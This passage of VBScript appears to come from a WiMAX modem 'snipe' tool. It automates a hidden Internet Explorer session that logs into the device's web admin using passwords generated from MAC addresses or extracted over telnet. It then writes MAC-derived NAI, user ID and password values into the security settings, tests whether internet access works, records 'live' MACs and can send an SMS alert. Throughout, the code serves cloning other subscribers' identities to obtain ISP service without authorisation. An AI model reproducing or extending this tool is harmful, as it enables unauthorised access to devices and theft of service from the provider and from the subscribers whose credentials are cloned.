'msgbox objSelect.options(i).value
If i < 1  Then
result = result &objSelect.options(i).value
Else
result = result &"|" &objSelect.options(i).value
End if
ReadDropDomainlistCmnd = result
next
End Function
''
Function ReadDropDomainlistCmndTLS
set objSelect = document.getElementById("snipeDomainDropdwnList")
for i = 8 to 11 ''objSelect.length -2 ''for i = 0 to objSelect.length - 2 '' 8-11 is from globlines,tls to innove,tls
'msgbox objSelect.options(i).value
If i = 8  Then
result = result &objSelect.options(i).value
Else
result = result &"|" &objSelect.options(i).value
End if
ReadDropDomainlistCmndTLS = result
next
End Function
''END read domain list
''BEGIN TestOut
Sub TestPattern
myNai=Replace(Trim(InputMacToGenPassword.value),":","")
If patternPassDropdwnList.value = "gemtek" then
MsgBox myNai,,"Pattern result..."
Else
advancePassUidAndPass = Trim(patternPassDropdwnList.value)
''myNai=Replace(Trim(InputMacToGenPassword.value),":","")
getMAcLastLength = Cint(numberOfDigitHexDropdwnList.value)
myCurrenMaclastHex = LCase(Mid(myNai,getMAcLastLength)) '' Return all characters, starting at postion 10
MsgBox advancePassUidAndPass & myCurrenMaclastHex,,"Pattern result..."
End If
''DisplayLogMacGenScan advancePassUidAndPass & myCurrenMaclastHex
End Sub
''END testOUT
''
Function IsSixToToMmac(macToCheck)
testResult = False
toToMmacSeries = "34,C8,E8,0C"
MyArrayCheckMac = Split(toToMmacSeries, ",", -1, 1)
MyArrayCheckMacLength = UBound(MyArrayCheckMac) +1
For i = 0 To MyArrayCheckMacLength-1
''MsgBox "array: "&MyArrayCheckMac(i)& " macTocheckChar2: " & Mid(macToCheck,1,2)
If Mid(macToCheck,1,2) = MyArrayCheckMac(i) Then
testResult = True
Exit For
End If
Next
IsSixToToMmac = testResult
End Function
''
''BEGIN Bm622m change SECURITY SNIPE
''ChangeSecurityOnlySnipe
Function ChangeSecuritySnipeSixToToM(macToTest,macDomain)
KillInternetExplorer
Dim IE,changeResult,macToTestValue,macDomainValue,macPassword
changeResult = 0
macPassword = ""
DisplayLogMacGenScan("Checking  " & inputTelnetHost.value & " Please WAIT....")
If PingHostLoop Then
''
''Begin Get 622 2011 pass
''End Get 622 2011 pass
''
macDomainOrig = macDomain
MyString = (Trim(macDomain))
MyArray = Split(MyString, ",", -1, 1)
MyArrayLength = UBound(MyArray) +1
macDomain = MyArray(0)
macPassword = Trim(MyArray(2)) 'userid and password
Sleeper 1000 
myNai=Replace(macToTest,":","")
Sleeper 1000
macNai =UCase(myNai)
advancePassUidAndPass = Trim(patternPassDropdwnList.value)
getMAcLastLength = Cint(numberOfDigitHexDropdwnList.value)
myCurrenMaclastHex = LCase(Mid(myNai,getMAcLastLength)) '' Return all characters, starting at postion 10
Sleeper 1000
Set IE = CreateObject("InternetExplorer.Application")
IE.Width = 200
IE.Height = 300
IE.Left = 0
IE.Top = 0 
IE.AddressBar = False
IE.MenuBar = False
IE.Toolbar = False
IE.Visible = 0
DisplayLogMacGenScan("Accessing  " & inputTelnetHost.value & " Please WAIT!....")
'IE.navigate "http://192.168.254.1" 
''IE.navigate "http://" & inputTelnetHost.value 
IE.navigate "http://" & inputTelnetHost.value &"/login.html"
On Error Resume Next ''REMOVE COMMENT 622m
''
WaitIEtoLoad(IE)
''Sleeper 3000 
'Set setUserName = IE.document.getElementByID("txt_Username") 
'setUserName.Value = Trim(inputWebAdminUname.value) 
''
IsUsernameExist = False
checkCountName = 0
Do
checkCountName = checkCountName + 1
IsUsernameExist = False
WaitIEtoLoad(IE)
IsUsernameExist = TestObjectCheckBtnLogin(IE) ''TestObjectUsername(IE,inputWebAdminUname.value)
If IsUsernameExist Then
DisplayLogMacGenScan "Accessing Ok...." 
DisplayLogMacGenScan "Login as USER: " & inputWebUserUname.value & " PASS: " & inputWebUserPassowrd.value
Sleeper 1000	
Set setUserName = IE.document.getElementByID("txt_Username") 
setUserName.Value = Trim(inputWebUserUname.value)  '' inputWebAdminUname.value ''"admin"
Sleeper 1000
Set setPassword = IE.document.getElementByID("txt_Password")
setPassword.Value = Trim(inputWebUserPassowrd.value)
Sleeper 2000
Exit Do
Else
If checkCountName = 3 Or checkCountName = 10 Or checkCountName = 15 Or checkCountName = 25 Then
IE.Refresh
ElseIf checkCountName = 35 Then
DisplayLogMacGenScan "Sorry failed to ACCESS WEB ADMIN on " & inputTelnetHost.value &"...."
DisplayLogMacGenScan "Problem in loading LOGIN page on " & inputTelnetHost.value &"...."
DisplayLogMacGenScan "Try to load your Current MAC. If successfull, USE the CHANGE SECURITY button." 
DisplayLogMacGenScan "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError LogContents.value  
IE.Quit
Sleeper 1000
ChangeSecuritySnipeSixToToM = 0
Exit Function
End If
If checkCountName = 17 Then
Sleeper 2000
Dim strTitle : strTitle = UCase(IE.Document.Title)
If InStr(strTitle, "CANNOT") <> 0 OR InStr(strTitle, "CAN'T") <> 0 Then 
''IE6,8,9''If InStr(strTitle, "CANNOT") <> 0 Then 
DisplayLogMacGenScan "Sorry failed to ACCESS on " & inputTelnetHost.value &"...."
DisplayLogMacGenScan "Webserver NOT FOUND on " & inputTelnetHost.value &"...."
DisplayLogMacGenScan "Try to load your Current MAC. If successfull use CHANGE SECURITY button." 
DisplayLogMacGenScan "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError LogContents.value  
IE.Quit
Sleeper 1000
ChangeSecuritySnipeSixToToM = 0
Exit Function
End If
End If

'		MsgBox "Not found"
''Exit Do
End If
Sleeper 2000
Loop While IsUsernameExist = False
IsUsernameExist = False
checkCountName = 0
''
''On Error Resume Next
DisplayLogMacGenScan "Logging-in...."
''begin check username again
Sleeper 1000
Do 
Set setUserNameAgain = IE.document.getElementByID("txt_Username") 
''setUserNameAgain.Value = Trim(inputWebUserUname.value) 
If Trim(setUserNameAgain.Value) <> Trim(inputWebUserUname.value) Then
DisplayLogMacGenScan "Trying to fillup username...."
setUserNameAgain.Value = Trim(inputWebUserUname.value) 
'Sleeper 300
Set setPasswordAgain = IE.document.getElementByID("txt_Password")
setPasswordAgain.Value = Trim(inputWebUserPassowrd.value)

End If
If Trim(setUserNameAgain.Value) = Trim(inputWebUserUname.value) Then
DisplayLogMacGenScan "Trying to login again...."
Set setBtnLogin = IE.document.getElementByID("btnLogin")
'Sleeper 300 
setBtnLogin.click
Exit Do
End If 
''end check username again
Loop While Trim(setUserNameAgain.Value) <> Trim(inputWebUserUname.value)
Sleeper 3000
WaitIEtoLoad(IE)
checkCountTitle = 0
Do 
'IsURLValid = False
''DisplayLogChangeMAConly IE.Document.Title
Dim strTitleAfterLoginTst : strTitleAfterLoginTst = UCase(IE.Document.Title)
''isTitle = InStr(strTitleAfterLoginTst, "LOGIN") 
''DisplayLogChangeMAConly isTitle
stringResult = InStr(strTitleAfterLoginTst, "LOGIN") 
checkCountTitle = checkCountTitle + 1
If checkCountTitle = 2 Then
DisplayLogMacGenScan "Waiting to login...."
End If 
''
If checkCountTitle = 8 Then
''IE.Refresh
DisplayLogMacGenScan "Trying to RECOVER invalid login on " & inputTelnetHost.value &"...."
createTxtLogError LogContents.value 
Sleeper 1000
''IE.navigate "http://" & inputTelnetHost.value 
IE.navigate "http://" & inputTelnetHost.value &"/login.html"
WaitIEtoLoad(IE)
IsUsernameExist = False
checkCountName = 0
Do
checkCountName = checkCountName + 1
IsUsernameExist = False
WaitIEtoLoad(IE)
IsUsernameExist = TestObjectCheckBtnLogin(IE) '' TestObjectUsername(IE,inputWebAdminUname.value)
If IsUsernameExist Then
DisplayLogMacGenScan "Accessing Ok....(recovery mode)" 	
DisplayLogMacGenScan "Login as USER: " & inputWebUserUname.value & "PASS: " & inputWebUserPassowrd.value
Sleeper 1000
'Set setUserName = IE.document.getElementByID("txt_Username") 
'setUserName.Value = Trim(inputWebUserUname.value) 
'Sleeper 1000
'Set setPassword = IE.document.getElementByID("txt_Password")
'setPassword.Value = Trim(inputWebUserPassowrd.value)
'Sleeper 2000
'Set setBtnLoginForTry = IE.document.getElementByID("btnLogin")
'Sleeper 1000 
'setBtnLoginForTry.click
Do 
Set setUserNameAgain = IE.document.getElementByID("txt_Username") 
''setUserNameAgain.Value = Trim(inputWebUserUname.value) 
If Trim(setUserNameAgain.Value) <> Trim(inputWebUserUname.value) Then
DisplayLogMacGenScan "Trying to fillup username...."
setUserNameAgain.Value = Trim(inputWebUserUname.value) 
'Sleeper 300
Set setPasswordAgain = IE.document.getElementByID("txt_Password")
setPasswordAgain.Value = Trim(inputWebUserPassowrd.value)

End If
If Trim(setUserNameAgain.Value) = Trim(inputWebUserUname.value) Then
DisplayLogMacGenScan "Trying to login again...."
Set setBtnLogin = IE.document.getElementByID("btnLogin")
'Sleeper 300 
setBtnLogin.click
Exit Do
End If 
''end check username again
Loop While Trim(setUserNameAgain.Value) <> Trim(inputWebUserUname.value)
Sleeper 2000
Exit Do
Else
If checkCountName = 3 Or checkCountName = 10 Or checkCountName = 15 Then
IE.Refresh
Sleeper 2000
ElseIf checkCountName = 25 Then
DisplayLogMacGenScan "Sorry failed to ACCESS WEB ADMIN on " & inputTelnetHost.value &"...."
DisplayLogMacGenScan "Problem in loading LOGIN page on " & inputTelnetHost.value &"...."
DisplayLogMacGenScan "Try to load your Current MAC. If successfull, USE the CHANGE SECURITY button."
DisplayLogMacGenScan "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError LogContents.value  
IE.Quit
Sleeper 1000
ChangeSecuritySnipeSixToToM = 0
Exit Function
End If
If checkCountName = 6 Then
Sleeper 2000
Dim strTitleTry : strTitleTry = UCase(IE.Document.Title)
If InStr(strTitleTry, "CANNOT") <> 0 OR InStr(strTitleTry, "CAN'T") <> 0 Then 
''IE6,8,9''If InStr(strTitle, "CANNOT") <> 0 Then 
DisplayLogMacGenScan "Sorry failed to ACCESS on " & inputTelnetHost.value &"...."
DisplayLogMacGenScan "Webserver NOT FOUND on " & inputTelnetHost.value &"...."
DisplayLogMacGenScan "Try to load your Current MAC. If successfull use CHANGE SECURITY button."
DisplayLogMacGenScan "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError LogContents.value  
IE.Quit
Sleeper 1000
ChangeSecuritySnipeSixToToM = 0
Exit Function
End If
End If
'		MsgBox "Not found"
''Exit Do
End If

Loop While IsUsernameExist = False
''
''On Error Resume Next

End If
''
Sleeper 5000 
If checkCountTitle > 15 Then
DisplayLogMacGenScan "Password: " & macPassword & " MAC: " & macToTest
DisplayLogMacGenScan "Sorry failed to ACCESS on " & inputTelnetHost.value &"...."
DisplayLogMacGenScan "Access DENIED on " & inputTelnetHost.value &"...."
DisplayLogMacGenScan "Process Aborted...."
DisplayLogMacGenScan "Tool Version: " & VersionAboutTool
createTxtLogError LogContents.value 
IE.Quit
Sleeper 1000
ChangeSecuritySnipeSixToToM = -1
If chkEnablePersistentSnipe.Checked Then
ChangeSecuritySnipeSixToToM = 0
End If
Exit Function
End If 
Loop While stringResult > 0
Sleeper 1000 

DisplayLogMacGenScan("Login OK....")
'Sleeper 5000
DisplayLogMacGenScan "Accessing Security..."
''
''BEGINcheck device link and get timestamp
IsDeviceLinkExist = False
checkCountName = 0
loginTimeStamp = ""
Do 
checkCountName = checkCountName + 1
IsDeviceLinkExist = False
IsDeviceLinkExist = TestObjectDeviceInfoTableSixToToM(IE)
If IsDeviceLinkExist Then
Set setDeviceInfoLink = IE.document.getElementByID("tabfrm").contentWindow.document.All("link_User_0_0_0")
linkhref =  setDeviceInfoLink.href
''MsgBox  "Found"
''DisplayLogChangeMAConly linkhref
MyString = (Trim(linkhref))
If MyString = "" Then
''loginTimeStamp = "NOT FOUND"
IsDeviceLinkExist = False
Else 
MyArray = Split(MyString,"?", -1, 1)
loginTimeStamp = MyArray(1) 
IsDeviceLinkExist = True
Exit Do 
End if

''Else
''MsgBox  "Not Found: " & checkCountName
End If
If checkCountName = 35 Then
Exit Do 
End If
Sleeper 2000

Loop While IsDeviceLinkExist = False
IsDeviceLinkExist = False
checkCountName = 0
''END check device link and get timestamp
''
DisplayLogMacGenScan "Session ID and Timestamp: "& loginTimeStamp
If loginTimeStamp = "" Then
DisplayLogMacGenScan  "Unable to get Session ID and Timestamp. Please Try Again....."
IE.Quit
deniedAccess = inputTelnetHost.value & " Unable to get Session ID and Timestamp. Please Try Again.....)"
createTxtLogError(deniedAccess)
Sleeper 1000
ChangeSecuritySnipeSixToToM = 0
Exit Function
End If
''
IE.Navigate2 "http://" & inputTelnetHost.value &"/wimax/security.html?"& loginTimeStamp
WaitIEtoLoad(IE)
chkAllowNaiSnipe.Disabled = True
IsSecurityExist = False
checkCountName = 0
Do
checkCountName = checkCountName + 1
IsSecurityExist = False
WaitIEtoLoad(IE)
IsSecurityExist = TestObject622mSecurity(IE)
If IsSecurityExist Then
DisplayLogMacGenScan "Accessing Security...OK"
DisplayLogMacGenScan "Domain Used: " & macDomain
''
''
If chkAllowNaiSnipe.Checked Then
Set setSecurityNai = IE.document.getElementByID("_WMX_ANONYMOUS_ID")
setSecurityNai.value = macNai & macDomain
End If	
Sleeper 1000
Set setSecurityUserId = IE.document.getElementByID("_WMX_USER_NAME")
''setSecurityUserId.value = inputUserId.value & drpDwnUserIdDomain.value 
If chkAdvancePass.Checked Then
''xpass begin
If patternPassDropdwnList.value = "gemtek" Then
setSecurityUserId.Value = macNai & macDomain
Else
setSecurityUserId.Value = advancePassUidAndPass & myCurrenMaclastHex & macDomain
End If
''xpass end  
Else
'	If checkSixToToM Then
'	DisplayLogMacGenScan "MAC series is for 622m....."
'	MyStringSixToToM = (Trim(setSecurityUserId.Value))
'	MyArraySixToToM = Split(MyStringSixToToM, "@", -1, 1)
'	macUserIdofSixToToM = MyArraySixToToM(0)
'	setSecurityUserId.Value = macUserIdofSixToToM & macDomain 
'	Else
'	setSecurityUserId.Value = macPassword & macDomain 
'	End If
setSecurityUserId.Value = macPassword & macDomain
End If
Sleeper 1000
Set setSecurityDomainPass = IE.document.getElementByID("_WMX_PASSW")
''setSecurityDomainPass.value = inputDomainPassword.value 
If chkAdvancePass.Checked Then
''xpass begin
If patternPassDropdwnList.value = "gemtek" Then
setSecurityDomainPass.Value = macNai
Else
setSecurityDomainPass.Value = advancePassUidAndPass & myCurrenMaclastHex
End If
''xpass end
Else
'	If checkSixToToM Then
'	setSecurityDomainPass.Value = macUserIdofSixToToM 
'	Else
'	setSecurityDomainPass.Value = macPassword 
'	End If
setSecurityDomainPass.Value = macPassword
End If
Sleeper 1000
set setBtnLogin = IE.document.getElementsByName("btnApply")
''btnvalue = setBtnLogin(0).value
setBtnLogin(0).Click ''REMOVE COMMENT bm622m
DisplayLogMacGenScan "Applying Changes...."
'DisplayLogMacGenScan "values of btnApply is: " & btnvalue
'Sleeper 1000
'Set setFromToSubmit = IE.document.getElementByID("AUTH_form")
'setFromToSubmit.Submit
Exit Do 
ElseIf checkCountName = 20 Then
DisplayLogMacGenScan "Sorry failed to ACCESS Security page on " & inputTelnetHost.value &"...."
createTxtLogError LogContents.value  
IE.Quit
Sleeper 1000
ChangeSecuritySnipeSixToToM = 0
Exit Function
End If
Sleeper 2000
Loop While IsSecurityExist = False
chkAllowNaiSnipe.Disabled = False
IsSecurityExist = False
checkCountName = 0

''END
Sleeper 7000
IE.Stop
If Err.Number = 0 Then
IE.Quit
Sleeper 1000
DisplayLogMacGenScan("Closing IE...." )
Set IE = Nothing
Sleeper 2000
''DisplayLogMacGenScan("Change settings finish...." & vbCr & vbLf & "Web ADMIN pass:" & macPassword)
DisplayLogMacGenScan("Change settings finish....")
''begin if stop by user
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
DisplayLogMacGenScan("Stopping process....Ok!")
hdnStopProcessResult.value = "1"
Exit Function
End If

macIsLive = "Dead"

DisplayLogMacGenScan("Testing internet connection....")
DisplayLogMacGenScan("PLEASE WAIT while the TESTING is not finish.... Number of tries is: " & snipeTryList.value)
DisplayLogMacGenScan("DO NOT CLOSE the TOOL in this process. Use STOP to cancel process!!!")
Sleeper 10000

If CheckInternetSnipe Then

appendLiveMacToFile macToTest,macDomainOrig
Sleeper 2000
macIsLive = "Alive"

If chkEnableSmsSnipe.Checked Then
DisplayLogMacGenScan "SMS/Text Notifier is enabled. Trying to send info.Please Wait......"
msgToSend = Mid(macToTest,1,8) & " series is ALIVE!!" 
numberTosend = Trim(inputPhone.value)
numberPrefix = liveIPTryList.value
If  numberTosend  <> "1234567" Then
If SendTextSMS(numberPrefix,numberTosend,msgToSend) Then
DisplayLogMacGenScan "Live MAC found SENT.... to " &numberPrefix & numberTosend
Else 
DisplayLogMacGenScan "Failed to Send SMS/text... to " &numberPrefix & numberTosend
End If
Else 
DisplayLogMacGenScan "You did not specifiy the phone number..."
End If
End If 
changeResult = 1
End If
''macToTest,macDomain
DisplayLogMacGenScan(macToTest & " is " & macIsLive & "!!!...." )
Sleeper 1000

checkTryCount = 0
deadCountHost = 0
liveCount = 0
Else

IE.quit
DisplayLogMacGenScan("Closing IE...." )
Set IE = Nothing
DisplayLogMacGenScan("Security Setting change FAILED!!!...." & vbCr & vbLf & "Check your MAC,Security Fields, Device and etc....."  )
DisplayLogMacGenScan("Error #: " & Err.Number & " Source: " & Err.Source & " Desc: " &  Err.Description)
Err.Clear
DisplayLogMacGenScan("Maybe the page takes time to load... And also check your DEVICE CURRENT MAC.") 
DisplayLogMacGenScan("Process aborted.... Please try again")
DisplayLogMacGenScan "Tool Version: " & VersionAboutTool
'ChangeSecuritySnipeSixToToM = 0
changeResult = 0
createTxtLogError LogContents.value 
hdnStopProcessResult.value = "1"
' Exit Function
End If 
Else
DisplayLogMacGenScan("Process aborted.... Please check your CONNECTION if your connected to WIMAX device.")
DisplayLogMacGenScan "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device."
DisplayLogMacGenScan "Tool Version: " & VersionAboutTool
createTxtLogError LogContents.value
hdnStopProcessResult.value = "1"
MsgBox "WIMAX device is unreachable... process aborted. Please check your connection.",16,"Connection Status"
End If
'MsgBox "Exiting change security"
ChangeSecuritySnipeSixToToM = changeResult 
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
DisplayLogMacGenScan "Tool Version: " & VersionAboutTool
createTxtLogError LogContents.value
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit Function
End If
End Function
''
''END Bm622m change SECURITY SNIPE
''
''
Sub TLSbm622OnlyOnChange
isAllowedSub = True
''
macDomainIsTLS = Trim(snipeDomainDropdwnList.value)
''domainList = "@globetel.com.ph"
MyStringIsTLS = (Trim(macDomainIsTLS))
MyArrayTLS = Split(MyStringIsTLS, ",", -1, 1)
MyArrayLengthTLS = UBound(MyArrayTLS) +1
''MsgBox MyArrayLength
''If macDomain = "@globelines.com.ph,TLS" Then
''If MyArrayLength = 2 Then
''macDomainIsTLS = MyArrayTLS(0)
''End If
''
If MyArrayTLS(1) = "TLS"  Then
isAllowedSub = TLSbm622Only
End If
If MyArrayLengthTLS = 3  Then
If MyArrayTLS(2) = "TLS"  Then
isAllowedSub = TLSbm622Only
End If
End If
If Not isAllowedSub Then
MsgBox "SORRY: TLS option will NOT WORK on your CURRENT DEVICE!!!.",16,"TLS is NOT AVAILABLE!!!"
snipeDomainDropdwnList.selectedIndex = 0
Exit Sub
'Else
'MsgBox "Ok"
End If 
End Sub
''
Function TLSbm622Only
isAllowed = True
If radiobtnBm622m2012.checked Then
isAllowed = False
ElseIf radiobtnDv235tG.checked Or radiobtnDv235tS.checked Then
isAllowed = False
'	ElseIf radiobtnBm622i2011.checked Then
'	isAllowed = False
'	ElseIf radiobtnBm622i.checked Then
'	isAllowed = False
End If
TLSbm622Only = isAllowed
End Function

''
''
''BEGIN change SECURITY SNIPE
Function ChangeSecurityOnlySnipe(macToTest,macDomain)
KillInternetExplorer
Dim IE,changeResult,macToTestValue,macDomainValue,macPassword
changeResult = 0
macPassword = ""
macPasswordAdmin = ""
''macToTestValue = macToTest
''macDomainValue = macDomain
''PingHostLoop
''If Ping(Trim(inputTelnetHost.value)) Then
DisplayLogMacGenScan("Checking  " & inputTelnetHost.value & " Please WAIT....")
If PingHostLoop Then
''
''Begin Get 622 2011 pass
bm6222011AdminPass =""
successUserLogin = False
If radiobtnBm6222011.checked Then
If radiobtnWebAdminCus.Checked And inputWebAdminPassowrd.value <> Trim("[ Forbidden ]") Then
DisplayLogMacGenScan "CUSTOMIZE Admin Password is ENABLED. (Password Generation aborted.....)"
bm6222011AdminPass = Trim(inputWebAdminPassowrd.value)
Else
''
successUserLogin = LoginWebToGetPass(inputTelnetHost.value ,2)
Sleeper 1000
If successUserLogin Then
ConnectToTST6222011GetPass(2)
DisplayLogMacGenScan "Checking extracted password result......"
Sleeper 1000
If GetBM6222011PassFromFile <> "NOT FOUND" Then	
bm6222011AdminPass = GetBM6222011PassFromFile
ClearSaveWebPage("TelnetOutPutCmndGetPass.txt")
Sleeper 1000
ClearSaveWebPage("TelnetInputCmndGetPass.txt")
DisplayLogMacGenScan "DECODED Admin pass: " & bm6222011AdminPass

Else
ClearSaveWebPage("TelnetOutPutCmndGetPass.txt")
Sleeper 1000
ClearSaveWebPage("TelnetInputCmndGetPass.txt")
DisplayLogMacGenScan "Cannot retrieve Admin Password......"
ChangeSecurityOnlySnipe = 0
Exit Function
End If
Else 
DisplayLogMacGenScan "Cannot ACCESS WEB Admin using Web User Account."
DisplayLogMacGenScan "Please CHECK your Web User Account. If it is correct"
ChangeSecurityOnlySnipe = 0
Exit Function
End If
''
End If
End If 
''End Get 622 2011 pass
''
macDomainOrig = macDomain
isTTLS = True
''domainList = "@globetel.com.ph"
MyString = (Trim(macDomain))
MyArray = Split(MyString, ",", -1, 1)
Sleeper 1000
MyArrayLength = UBound(MyArray) +1
''MsgBox MyArrayLength
''If macDomain = "@globelines.com.ph,TLS" Then
''If MyArrayLength = 2 Then
macDomain = MyArray(0)
''End If
If MyArray(1) = "TLS" Then
isTTLS = False
End If 
''macPassword = Trim(generatePassword(macToTest)) 'userid and password
macPasswordAdmin = Trim(generatePassword(macToTest))
Sleeper 1000 
macPassword = Trim(MyArray(2)) 'userid and password
Sleeper 1000 
myNai=Replace(macToTest,":","")
Sleeper 1000
macNai =UCase(myNai)
''advancePassUidAndPass = "wimax"
advancePassUidAndPass = Trim(patternPassDropdwnList.value)
getMAcLastLength = Cint(numberOfDigitHexDropdwnList.value)
myCurrenMaclastHex = LCase(Mid(myNai,getMAcLastLength)) '' Return all characters, starting at postion 10
Sleeper 1000
Set IE = CreateObject("InternetExplorer.Application")
IE.Width = 200
IE.Height = 300
IE.Left = 0
IE.Top = 0 
IE.AddressBar = False
IE.MenuBar = False
IE.Toolbar = False
IE.Visible = 0
DisplayLogMacGenScan("Accessing  " & inputTelnetHost.value & " Please WAIT!....")
'IE.navigate "http://192.168.254.1" 
IE.navigate "http://" & inputTelnetHost.value 
On Error Resume Next
''
WaitIEtoLoad(IE)
''Sleeper 3000 
'Set setUserName = IE.document.getElementByID("txt_Username") 
'setUserName.Value = Trim(inputWebAdminUname.value) 
''
IsUsernameExist = False
checkCountName = 0
Do
checkCountName = checkCountName + 1
IsUsernameExist = False
WaitIEtoLoad(IE)
IsUsernameExist = TestObjectCheckBtnLogin(IE) ''TestObjectUsername(IE,inputWebAdminUname.value)
If IsUsernameExist Then
DisplayLogMacGenScan "Accessing Ok...." 	
Set setUserName = IE.document.getElementByID("txt_Username") 
setUserName.Value = inputWebAdminUname.value ''"admin"
Sleeper 1000
'' DisplayLogChangeMAConly "Filling up Username as: " & setUserName.Value
Set setPassword = IE.document.getElementByID("txt_Password")
Sleeper 1000 
If radiobtnBm6222011.checked Then
setPassword.Value = bm6222011AdminPass
Else
setPassword.Value = macPasswordAdmin 
End if
If radiobtnWebAdminCus.Checked Then
If inputWebAdminPassowrd.value <> Trim("[ Forbidden ]") then
setPassword.Value = Trim(inputWebAdminPassowrd.value)
End If 
End If
Sleeper 2000
Exit Do
Else
If checkCountName = 3 Or checkCountName = 10 Or checkCountName = 15 Or checkCountName = 25 Then
IE.Refresh
ElseIf checkCountName = 35 Then
DisplayLogMacGenScan "Sorry failed to ACCESS WEB ADMIN on " & inputTelnetHost.value &"...."
DisplayLogMacGenScan "Problem in loading LOGIN page on " & inputTelnetHost.value &"...."
DisplayLogMacGenScan "Try to load your Current MAC. If successfull, USE the CHANGE SECURITY button." 
DisplayLogMacGenScan "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError LogContents.value  
IE.Quit
Sleeper 1000
ChangeSecurityOnlySnipe = 0
Exit Function
End If
If checkCountName = 17 Then
Sleeper 2000
Dim strTitle : strTitle = UCase(IE.Document.Title)
If InStr(strTitle, "CANNOT") <> 0 OR InStr(strTitle, "CAN'T") <> 0 Then 
''IE6,8,9''If InStr(strTitle, "CANNOT") <> 0 Then 
DisplayLogMacGenScan "Sorry failed to ACCESS on " & inputTelnetHost.value &"...."
DisplayLogMacGenScan "Webserver NOT FOUND on " & inputTelnetHost.value &"...."
DisplayLogMacGenScan "Try to load your Current MAC. If successfull use CHANGE SECURITY button." 
DisplayLogMacGenScan "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError LogContents.value  
IE.Quit
Sleeper 1000
ChangeSecurityOnlySnipe = 0
Exit Function
End If
End If

'		MsgBox "Not found"
''Exit Do
End If
Sleeper 2000
Loop While IsUsernameExist = False
IsUsernameExist = False
checkCountName = 0
''
''On Error Resume Next
DisplayLogMacGenScan "Logging-in...."
Set setBtnLogin = IE.document.getElementByID("btnLogin")
Sleeper 1000 
setBtnLogin.click
Sleeper 3000
WaitIEtoLoad(IE)
checkCountTitle = 0
Do 
'IsURLValid = False
''DisplayLogChangeMAConly IE.Document.Title
Dim strTitleAfterLoginTst : strTitleAfterLoginTst = UCase(IE.Document.Title)
''isTitle = InStr(strTitleAfterLoginTst, "LOGIN") 
''DisplayLogChangeMAConly isTitle
stringResult = InStr(strTitleAfterLoginTst, "LOGIN") 
checkCountTitle = checkCountTitle + 1
If checkCountTitle = 2 Then
DisplayLogMacGenScan "Waiting to login...."
End If 
''
If checkCountTitle = 8 Then
''IE.Refresh
DisplayLogMacGenScan "Trying to RECOVER invalid login on " & inputTelnetHost.value &"...."
createTxtLogError LogContents.value 
Sleeper 1000
IE.navigate "http://" & inputTelnetHost.value 
WaitIEtoLoad(IE)
IsUsernameExist = False
checkCountName = 0
Do
checkCountName = checkCountName + 1
IsUsernameExist = False
WaitIEtoLoad(IE)
IsUsernameExist = TestObjectCheckBtnLogin(IE) ''TestObjectUsername(IE,inputWebAdminUname.value)
If IsUsernameExist Then
Set setUserName = IE.document.getElementByID("txt_Username") 
setUserName.Value = inputWebAdminUname.value ''"admin"
Sleeper 1000
'' DisplayLogChangeMAConly "Filling up Username as: " & setUserName.Value
Set setPassword = IE.document.getElementByID("txt_Password")
If radiobtnBm6222011.checked Then
setPassword.Value = bm6222011AdminPass
Else
setPassword.Value = macPasswordAdmin ''macPassword 
End If
If radiobtnWebAdminCus.Checked Then
If inputWebAdminPassowrd.value <> Trim("[ Forbidden ]") then
setPassword.Value = Trim(inputWebAdminPassowrd.value)
End If 
End If
Sleeper 2000
Set setBtnLoginForTry = IE.document.getElementByID("btnLogin")
Sleeper 1000 
setBtnLoginForTry.click
Sleeper 2000
Exit Do
Else
If checkCountName = 3 Or checkCountName = 10 Or checkCountName = 15 Then
IE.Refresh
Sleeper 2000
ElseIf checkCountName = 25 Then
DisplayLogMacGenScan "Sorry failed to ACCESS WEB ADMIN on " & inputTelnetHost.value &"...."
DisplayLogMacGenScan "Problem in loading LOGIN page on " & inputTelnetHost.value &"...."
DisplayLogMacGenScan "Try to load your Current MAC. If successfull, USE the CHANGE SECURITY button."
DisplayLogMacGenScan "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError LogContents.value  
IE.Quit
Sleeper 1000
ChangeSecurityOnlySnipe = 0
Exit Function
End If
If checkCountName = 6 Then
Sleeper 2000
Dim strTitleTry : strTitleTry = UCase(IE.Document.Title)
If InStr(strTitleTry, "CANNOT") <> 0 OR InStr(strTitleTry, "CAN'T") <> 0 Then 
''IE6,8,9''If InStr(strTitle, "CANNOT") <> 0 Then 
DisplayLogMacGenScan "Sorry failed to ACCESS on " & inputTelnetHost.value &"...."
DisplayLogMacGenScan "Webserver NOT FOUND on " & inputTelnetHost.value &"...."
DisplayLogMacGenScan "Try to load your Current MAC. If successfull use CHANGE SECURITY button."
DisplayLogMacGenScan "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError LogContents.value  
IE.Quit
Sleeper 1000
ChangeSecurityOnlySnipe = 0
Exit Function
End If
End If
'		MsgBox "Not found"
''Exit Do
End If

Loop While IsUsernameExist = False
''
''On Error Resume Next

End If
''
Sleeper 5000 
If checkCountTitle > 15 Then
DisplayLogMacGenScan "Admin Password: " & macPasswordAdmin & " MAC: " & macToTest
DisplayLogMacGenScan "Sorry failed to ACCESS on " & inputTelnetHost.value &"...."
DisplayLogMacGenScan "Access DENIED on " & inputTelnetHost.value &"...."
DisplayLogMacGenScan "Process Aborted...."
DisplayLogMacGenScan "Tool Version: " & VersionAboutTool
createTxtLogError LogContents.value 
IE.Quit
Sleeper 1000
ChangeSecurityOnlySnipe = -1
If chkEnablePersistentSnipe.Checked Then
ChangeSecurityOnlySnipe = 0
End If
Exit Function
End If 
Loop While stringResult > 0
Sleeper 1000 

DisplayLogMacGenScan("Login OK....")
'Sleeper 5000
DisplayLogMacGenScan "Accessing Security..."

IsSecurityBtnExist = False
checkCountSecurityBtn = 0
Do
checkCountSecurityBtn = checkCountSecurityBtn + 1
